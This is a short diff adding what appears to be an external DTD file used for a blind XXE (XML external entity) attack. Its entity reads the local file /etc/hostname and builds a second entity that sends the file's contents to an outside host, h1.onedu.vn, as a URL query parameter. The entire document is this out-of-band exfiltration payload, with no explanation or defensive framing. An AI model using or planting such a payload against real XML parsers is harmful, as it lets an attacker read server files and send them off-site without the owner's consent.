@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % data SYSTEM "file:///etc/hostname">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://h1.onedu.vn/?%data;'>">
